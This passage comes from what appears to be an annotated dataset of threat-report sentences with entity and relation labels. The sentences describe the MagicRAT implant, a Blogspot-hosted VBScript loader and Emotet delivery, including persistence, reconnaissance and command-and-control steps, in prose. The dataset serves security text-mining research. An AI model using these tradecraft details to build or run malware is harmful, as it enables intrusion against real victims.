"."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "for", "an", "initial", "beacon", "."], ["Modules", "for", "implanting", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "that", "sends", "a", "signal", "to", "an", "attacker-controlled", "remote", "location", ",", "signifying", "the", "successful", "victim", "compromise", "."], ["Decoded", "content", "from", "a", "post", "published", "in", "July", "2021", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "blog", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "VBScript", "pos": [4, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "Stage 3", "pos": [10, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "Stage 3", "pos": [2, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "content", "pos": [17, 18], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [40, 40], "name": "endpoint", "pos": [24, 25], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "Stage 3", "pos": [0, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "blogpost 's content", "pos": [6, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "VBScript", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [63, 63], "name": "Blogspot content", "pos": [1, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [71, 71], "name": "initial beacon", "pos": [3, 5], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [87, 87], "name": "VBS code", "pos": [8, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [92, 92], "name": "signal", "pos": [13, 14], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [95, 95], "name": "attacker-controlled remote location", "pos": [16, 19], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [105, 105], "name": "Decoded content", "pos": [0, 2], "index": "14_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "ST", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "RF", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 2, "t": 10}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 2, "t": 6}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "EX", "evidence": [2], "h": 6, "t": 8}, {"r": "CO", "evidence": [1, 2, 3], "t": 4, "h": 9}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}, {"r": "ST", "evidence": [6], "h": 11, "t": 13}, {"r": "RF", "evidence": [6], "h": 11, "t": 13}]}, {"title": "14_g02-13", "sents": [["Furthermore", ",", "Stage", "3", "scans", "the", "blogpost", "for", "special", "tags", "that", "identify", "its", "body", ",", "decodes", "the", "content", ",", "and", "executes", "it", "on", "the", "endpoint", ":"], ["Stage", "3", "extracts", "and", "analyzes", "the", "blogpost", "'s", "content", "to", "identify", "the", "next", "VBScript", "to", "execute", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "for", "an", "initial", "beacon", "."], ["Modules", "for", "implanting", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "that", "sends", "a", "signal", "to", "an", "attacker-controlled", "remote", "location", ",", "signifying", "the", "successful", "victim", "compromise", "."], ["Decoded", "content", "from", "a", "post", "published", "in", "July", "2021", "."], ["The", "Stage", "3", "VBS", "scripts", "are", "set", "up", "to", "launch", "at", "Startup", "(", "via", "the", "LNK", "in", "the", "Startup", "directory", "installed", "by", "the", "Stage", "2", "scripts", ")", "whenever", "the", "victim", "logs", "back", "into", "their", "system", "or", "restarts", "it", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "Stage 3", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "content", "pos": [17, 18], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [24, 24], "name": "endpoint", "pos": [24, 25], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "Stage 3", "pos": [0, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "blogpost 's content", "pos": [6, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "VBScript", "pos": [13, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "Blogspot content", "pos": [1, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [55, 55], "name": "initial beacon", "pos": [3, 5], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [71, 71], "name": "VBS code", "pos": [8, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [76, 76], "name": "signal", "pos": [13, 14], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [79, 79], "name": "attacker-controlled remote location", "pos": [16, 19], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [89, 89], "name": "Decoded content", "pos": [0, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [102, 102], "name": "VBS scripts", "pos": [3, 5], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [114, 114], "name": "LNK", "pos": [15, 16], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [122, 122], "name": "Stage 2 scripts", "pos": [23, 26], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [0, 1, 2], "t": 1, "h": 6}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "ST", "evidence": [5], "h": 8, "t": 10}, {"r": "RF", "evidence": [5], "h": 8, "t": 10}, {"r": "WR", "evidence": [7], "t": 13, "h": 14}, {"r": "WR", "evidence": [6, 7], "t": 11, "h": 14}, {"r": "WR", "evidence": [7], "t": 12, "h": 14}]}, {"title": "14_g02-14", "sents": [["Stage", "3", "extracts", "and", "analyzes", "the", "blogpost", "'s", "content", "to", "identify", "the", "next", "VBScript", "to", "execute", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "for", "an", "initial", "beacon", "."], ["Modules", "for", "implanting", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "that", "sends", "a", "signal", "to", "an", "attacker-controlled", "remote", "location", ",", "signifying", "the", "successful", "victim", "compromise", "."], ["Decoded", "content", "from", "a", "post", "published", "in", "July", "2021", "."], ["The", "Stage", "3", "VBS", "scripts", "are", "set", "up", "to", "launch", "at", "Startup", "(", "via", "the", "LNK", "in", "the", "Startup", "directory", "installed", "by", "the", "Stage", "2", "scripts", ")", "whenever", "the", "victim", "logs", "back", "into", "their", "system", "or", "restarts", "it", "."], ["As", "a", "result", ",", "every", "time", "the", "victim", "logs", "back", "into", "the", "infected", "endpoint", ",", "the", "Stage", "3", "VBScript", "looks", "for", "harmful", "content", "in", "the", "malicious", "Blogspot", "location", "to", "execute", "on", "the", "victim", "'s", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Stage 3", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "blogpost 's content", "pos": [6, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "VBScript", "pos": [13, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "Blogspot content", "pos": [1, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [29, 29], "name": "initial beacon", "pos": [3, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [45, 45], "name": "VBS code", "pos": [8, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [50, 50], "name": "signal", "pos": [13, 14], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [53, 53], "name": "attacker-controlled remote location", "pos": [16, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [63, 63], "name": "Decoded content", "pos": [0, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [76, 76], "name": "VBS scripts", "pos": [3, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [88, 88], "name": "LNK", "pos": [15, 16], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [96, 96], "name": "Stage 2 scripts", "pos": [23, 26], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [128, 128], "name": "Stage 3 VBScript", "pos": [16, 19], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [138, 138], "name": "Blogspot location", "pos": [26, 28], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [4], "h": 5, "t": 6}, {"r": "ST", "evidence": [4], "h": 5, "t": 7}, {"r": "RF", "evidence": [4], "h": 5, "t": 7}, {"r": "WR", "evidence": [6], "t": 10, "h": 11}, {"r": "WR", "evidence": [5, 6], "t": 8, "h": 11}, {"r": "WR", "evidence": [6], "t": 9, "h": 11}, {"r": "RD", "evidence": [7], "h": 12, "t": 13}]}, {"title": "14_g02-15", "sents": [["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "for", "an", "initial", "beacon", "."], ["Modules", "for", "implanting", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "that", "sends", "a", "signal", "to", "an", "attacker-controlled", "remote", "location", ",", "signifying", "the", "successful", "victim", "compromise", "."], ["Decoded", "content", "from", "a", "post", "published", "in", "July", "2021", "."], ["The", "Stage", "3", "VBS", "scripts", "are", "set", "up", "to", "launch", "at", "Startup", "(", "via", "the", "LNK", "in", "the", "Startup", "directory", "installed", "by", "the", "Stage", "2", "scripts", ")", "whenever", "the", "victim", "logs", "back", "into", "their", "system", "or", "restarts", "it", "."], ["As", "a", "result", ",", "every", "time", "the", "victim", "logs", "back", "into", "the", "infected", "endpoint", ",", "the", "Stage", "3", "VBScript", "looks", "for", "harmful", "content", "in", "the", "malicious", "Blogspot", "location", "to", "execute", "on", "the", "victim", "'s", "system", "."], ["This", "gives", "the", "attackers", "enough", "time", "to", "alter", "the", "blog", "post", "'s", "content", "with", "new", "malevolent", "content", "that", "can", "be", "executed", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "Blogspot content", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [9, 9], "name": "initial beacon", "pos": [3, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [25, 25], "name": "VBS code", "pos": [8, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [30, 30], "name": "signal", "pos": [13, 14], "index": "3_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [33, 33], "name": "attacker-controlled remote location", "pos": [16, 19], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [43, 43], "name": "Decoded content", "pos": [0, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [56, 56], "name": "VBS scripts", "pos": [3, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [68, 68], "name": "LNK", "pos": [15, 16], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [76, 76], "name": "Stage 2 scripts", "pos": [23, 26], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [108, 108], "name": "Stage 3 VBScript", "pos": [16, 19], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [118, 118], "name": "Blogspot location", "pos": [26, 28], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [131, 131], "name": "attackers", "pos": [3, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [140, 140], "name": "content", "pos": [12, 13], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [142, 142], "name": "new malevolent content", "pos": [14, 17], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [3], "h": 2, "t": 3}, {"r": "ST", "evidence": [3], "h": 2, "t": 4}, {"r": "RF", "evidence": [3], "h": 2, "t": 4}, {"r": "WR", "evidence": [5], "t": 7, "h": 8}, {"r": "WR", "evidence": [4, 5], "t": 5, "h": 8}, {"r": "WR", "evidence": [5], "t": 6, "h": 8}, {"r": "RD", "evidence": [6], "h": 9, "t": 10}, {"r": "UK", "evidence": [3, 4, 5, 6, 7], "t": 2, "h": 11}, {"r": "WR", "evidence": [7], "h": 11, "t": 12}, {"r": "EX", "evidence": [7], "h": 11, "t": 13}]}, {"title": "04_g01-0", "sents": [["Written", "in", "C++", "programming", "language", ",", "MagicRAT", "statically", "links", "to", "the", "RAT", "on", "32-", "and", "64-bit", "versions", "using", "the", "Qt", "Framework", "'s", "classes", "throughout", "its", "entire", "code", "."], ["It", "stores", "the", "configuration", "dynamically", "in", "a", "QSettings", "class", "before", "saving", "it", "to", "disk", ",", "as", "typical", "for", "that", "class", "."], ["The", "file", "``", "visual.1991-06.com.microsoft_sd.kit", "''", "located", "at", "``", "\\ProgramData\\WindowsSoftwareToolkit", "''", "stores", "the", "malware", "configuration", "(", "which", "contains", "author-defined", "QSettings", ")", "to", "deceive", "unsuspecting", "victims", "into", "believing", "it", "is", "part", "of", "the", "operating", "system", "."], ["The", "configuration", "contains", "the", "command", "and", "control", "(", "C2", ")", "URLs", "stored", "with", "the", "key", "``", "windows", ",", "''", "``", "linux", ",", "''", "and", "``", "mac", ".", "''"], ["Encoded", "C2", "URLs", ",", "used", "to", "register", "infections", "and", "receive", "commands", "to", "execute", "on", "the", "infected", "endpoint", ",", "are", "present", "in", "all", "analyzed", "samples", "."], ["Upon", "execution", ",", "MagicRAT", "executes", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", ",", "achieving", "persistence", "for", "itself", "."], ["System", "reconnaissance", "is", "performed", "during", "the", "initial", "stages", "of", "execution", "by", "executing", "whoami", ",", "systeminfo", "and", "ipconfig", "/all", "commands", "to", "identify", "the", "system", "and", "environment", "in", "which", "the", "attackers", "are", "operating", "to", "get", "system", "information", "."], ["The", "results", "of", "the", "last", "command", "are", "uploaded", "to", "the", "C2", "via", "the", "file", "zero_dump.mix", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "MagicRAT", "pos": [6, 7], "index": "0_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [112, 112], "name": "C2", "pos": [1, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [134, 134], "name": "samples", "pos": [23, 24], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [139, 139], "name": "MagicRAT", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "command", "pos": [7, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [170, 170], "name": "whoami", "pos": [12, 13], "index": "5_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [172, 172], "name": "systeminfo", "pos": [14, 15], "index": "6_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [174, 174], "name": "ipconfig", "pos": [16, 17], "index": "7_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [191, 191], "name": "system information", "pos": [33, 35], "index": "8_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [204, 204], "name": "C2", "pos": [10, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [208, 208], "name": "zero_dump.mix", "pos": [14, 15], "index": "10_0"}]], "labels": [{"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 2}, {"r": "EX", "evidence": [0, 1, 2, 3, 4, 5], "t": 0, "h": 3}, {"r": "ST", "evidence": [4, 5], "t": 1, "h": 3}, {"r": "RF", "evidence": [4, 5], "t": 1, "h": 3}, {"r": "EX", "evidence": [4, 5], "t": 2, "h": 3}, {"r": "EX", "evidence": [5], "h": 3, "t": 4}, {"r": "FR", "evidence": [5, 6], "h": 3, "t": 5}, {"r": "FR", "evidence": [5, 6], "h": 3, "t": 6}, {"r": "FR", "evidence": [5, 6], "h": 3, "t": 7}, {"r": "RD", "evidence": [5, 6], "h": 3, "t": 8}, {"r": "ST", "evidence": [5, 6, 7], "h": 3, "t": 9}, {"r": "WR", "evidence": [5, 6, 7], "h": 3, "t": 10}]}, {"title": "04_g01-1", "sents": [["It", "stores", "the", "configuration", "dynamically", "in", "a", "QSettings", "class", "before", "saving", "it", "to", "disk", ",", "as", "typical", "for", "that", "class", "."], ["The", "file", "``", "visual.1991-06.com.microsoft_sd.kit", "''", "located", "at", "``", "\\ProgramData\\WindowsSoftwareToolkit", "''", "stores", "the", "malware", "configuration", "(", "which", "contains", "author-defined", "QSettings", ")", "to", "deceive", "unsuspecting", "victims", "into", "believing", "it", "is", "part", "of", "the", "operating", "system", "."], ["The", "configuration", "contains", "the", "command", "and", "control", "(", "C2", ")", "URLs", "stored", "with", "the", "key", "``", "windows", ",", "''", "``", "linux", ",", "''", "and", "``", "mac", ".", "''"], ["Encoded", "C2", "URLs", ",", "used", "to", "register", "infections", "and", "receive", "commands", "to", "execute", "on", "the", "infected", "endpoint", ",", "are", "present", "in", "all", "analyzed", "samples", "."], ["Upon", "execution", ",", "MagicRAT", "executes", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", ",", "achieving", "persistence", "for", "itself", "."], ["System", "reconnaissance", "is", "performed", "during", "the", "initial", "stages", "of", "execution", "by", "executing", "whoami", ",", "systeminfo", "and", "ipconfig", "/all", "commands", "to", "identify", "the", "system", "and", "environment", "in", "which", "the", "attackers", "are", "operating", "to", "get", "system", "information", "."], ["The", "results", "of", "the", "last", "command", "are", "uploaded", "to", "the", "C2", "via", "the", "file", "zero_dump.mix", "."], ["Operators", "can", "modify", "the", "timing", "for", "the", "implant", "to", "sleep", ",", "change", "the", "C2", "URLs", ",", "or", "delete", "the", "implant", "from", "the", "infected", "system", "."]], "vertexSet": [[{"type": "SO", "sent_id": 3, "global_pos": [84, 84], "name": "C2", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [106, 106], "name": "samples", "pos": [23, 24], "index": "1_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "MagicRAT", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [115, 115], "name": "command", "pos": [7, 8], "index": "3_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [142, 142], "name": "whoami", "pos": [12, 13], "index": "4_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [144, 144], "name": "systeminfo", "pos": [14, 15], "index": "5_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [146, 146], "name": "ipconfig", "pos": [16, 17], "index": "6_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [163, 163], "name": "system information", "pos": [33, 35], "index": "7_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [176, 176], "name": "C2", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [180, 180], "name": "zero_dump.mix", "pos": [14, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [182, 182], "name": "Operators", "pos": [0, 1], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [189, 189], "name": "implant to sleep", "pos": [7, 10], "index": "11_0"}]], "labels": [{"r": "ST", "evidence": [3, 4], "t": 0, "h": 2}, {"r": "RF", "evidence": [3, 4], "t": 0, "h": 2}, {"r": "EX", "evidence": [3, 4], "t": 1, "h": 2}, {"r": "EX", "evidence": [4], "h": 2, "t": 3}, {"r": "FR", "evidence": [4, 5], "h": 2, "t": 4}, {"r": "FR", "evidence": [4, 5], "h": 2, "t": 5}, {"r": "FR", "evidence": [4, 5], "h": 2, "t": 6}, {"r": "RD", "evidence": [4, 5], "h": 2, "t": 7}, {"r": "ST", "evidence": [4, 5, 6], "h": 2, "t": 8}, {"r": "WR", "evidence": [4, 5, 6], "h": 2, "t": 9}, {"r": "RF", "evidence": [6, 7], "t": 8, "h": 10}, {"r": "RD", "evidence": [7], "h": 10, "t": 11}, {"r": "WR", "evidence": [7], "h": 10, "t": 11}]}, {"title": "04_g01-2", "sents": [["The", "file", "``", "visual.1991-06.com.microsoft_sd.kit", "''", "located", "at", "``", "\\ProgramData\\WindowsSoftwareToolkit", "''", "stores", "the", "malware", "configuration", "(", "which", "contains", "author-defined", "QSettings", ")", "to", "deceive", "unsuspecting", "victims", "into", "believing", "it", "is", "part", "of", "the", "operating", "system", "."], ["The", "configuration", "contains", "the", "command", "and", "control", "(", "C2", ")", "URLs", "stored", "with", "the", "key", "``", "windows", ",", "''", "``", "linux", ",", "''", "and", "``", "mac", ".", "''"], ["Encoded", "C2", "URLs", ",", "used", "to", "register", "infections", "and", "receive", "commands", "to", "execute", "on", "the", "infected", "endpoint", ",", "are", "present", "in", "all", "analyzed", "samples", "."], ["Upon", "execution", ",", "MagicRAT", "executes", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", ",", "achieving", "persistence", "for", "itself", "."], ["System", "reconnaissance", "is", "performed", "during", "the", "initial", "stages", "of", "execution", "by", "executing", "whoami", ",", "systeminfo", "and", "ipconfig", "/all", "commands", "to", "identify", "the", "system", "and", "environment", "in", "which", "the", "attackers", "are", "operating", "to", "get", "system", "information", "."], ["The", "results", "of", "the", "last", "command", "are", "uploaded", "to", "the", "C2", "via", "the", "file", "zero_dump.mix", "."], ["Operators", "can", "modify", "the", "timing", "for", "the", "implant", "to", "sleep", ",", "change", "the", "C2", "URLs", ",", "or", "delete", "the", "implant", "from", "the", "infected", "system", "."], ["Moreover", ",", "MagicRAT", "has", "the", "capability", "to", "delete", "itself", "from", "the", "infected", "endpoint", "using", "a", "BAT", "file", "."]], "vertexSet": [[{"type": "SO", "sent_id": 2, "global_pos": [63, 63], "name": "C2", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [85, 85], "name": "samples", "pos": [23, 24], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "MagicRAT", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [94, 94], "name": "command", "pos": [7, 8], "index": "3_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [121, 121], "name": "whoami", "pos": [12, 13], "index": "4_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [123, 123], "name": "systeminfo", "pos": [14, 15], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [125, 125], "name": "ipconfig", "pos": [16, 17], "index": "6_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [142, 142], "name": "system information", "pos": [33, 35], "index": "7_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [155, 155], "name": "C2", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [159, 159], "name": "zero_dump.mix", "pos": [14, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [161, 161], "name": "Operators", "pos": [0, 1], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [168, 168], "name": "implant to sleep", "pos": [7, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [194, 194], "name": "itself", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [201, 201], "name": "BAT file", "pos": [15, 17], "index": "13_0"}]], "labels": [{"r": "ST", "evidence": [2, 3], "t": 0, "h": 2}, {"r": "RF", "evidence": [2, 3], "t": 0, "h": 2}, {"r": "EX", "evidence": [2, 3], "t": 1, "h": 2}, {"r": "EX", "evidence": [3], "h": 2, "t": 3}, {"r": "FR", "evidence": [3, 4], "h": 2, "t": 4}, {"r": "FR", "evidence": [3, 4], "h": 2, "t": 5}, {"r": "FR", "evidence": [3, 4], "h": 2, "t": 6}, {"r": "RD", "evidence": [3, 4], "h": 2, "t": 7}, {"r": "ST", "evidence": [3, 4, 5], "h": 2, "t": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 2, "t": 9}, {"r": "UK", "evidence": [3, 4, 5, 6, 7], "h": 2, "t": 13}, {"r": "RF", "evidence": [5, 6], "t": 8, "h": 10}, {"r": "RD", "evidence": [6], "h": 10, "t": 11}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "WR", "evidence": [6, 7], "h": 10, "t": 12}]}, {"title": "13_g02-0", "sents": [["Trickbot", "C2", "servers", "were", "observed", "issuing", "a", "command", "to", "Trickbot", "infections", "associated", "with", "various", "gtags", "."], ["As", "a", "result", ",", "new", "malicious", "email", "campaigns", "that", "directly", "deliver", "Emotet", "to", "victims", "emerged", "."], ["These", "campaigns", "target", "victims", "with", "email", "thread", "hijacking", "and", "typically", "include", "an", "attached", "downloader", "file", "that", "retrieves", "the", "Emotet", "payload", "."], ["Emotet", "uses", "various", "types", "of", "archives", "including", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "which", "contain", "OLE2", "macros", "."], ["When", "these", "macros", "are", "executed", "and", "it", "invokes", "PowerShell", ",", "which", "retrieves", "the", "Emotet", "DLL", "from", "an", "attacker-controlled", "distribution", "server", "."], ["The", "macros", "are", "obfuscated", ",", "however", ",", "the", "PowerShell", "invocation", "is", "revealed", "after", "being", "deobfuscated", "at", "runtime", "."], ["The", "DLL", "is", "then", "executed", "by", "rundll32.exe", ",", "infecting", "the", "system", "with", "Emotet", "."], ["Once", "rundll32.exe", "executes", ",", "the", "DLL", "is", "stored", "in", "a", "random", "filename", "in", "either", "the", "``", "C", ":", "\\\\ProgramData\\\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64\\", "<", "RANDOM", "FILENAME", ">", ".", "''", "directories", "to", "achieve", "persistence", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [0, 0], "name": "Trickbot C2 servers", "pos": [0, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "Trickbot", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "email campaigns", "pos": [6, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "Emotet", "pos": [11, 12], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [29, 29], "name": "victims", "pos": [13, 14], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [33, 33], "name": "campaigns", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [35, 35], "name": "victims", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [37, 37], "name": "email", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "attached downloader file", "pos": [12, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "Emotet payload", "pos": [18, 20], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [53, 53], "name": "Emotet", "pos": [0, 1], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [60, 60], "name": "DOCM", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [62, 62], "name": "XLSM", "pos": [9, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "password-protected ZIP", "pos": [12, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "OLE2 macros", "pos": [16, 18], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [74, 74], "name": "macros", "pos": [2, 3], "index": "15_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [80, 80], "name": "PowerShell", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "Emotet DLL", "pos": [13, 15], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [90, 90], "name": "distribution server", "pos": [18, 20], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [94, 94], "name": "macros", "pos": [1, 2], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [101, 101], "name": "PowerShell", "pos": [8, 9], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [112, 112], "name": "DLL", "pos": [1, 2], "index": "21_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [117, 117], "name": "rundll32.exe", "pos": [6, 7], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [123, 123], "name": "Emotet", "pos": [12, 13], "index": "23_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [126, 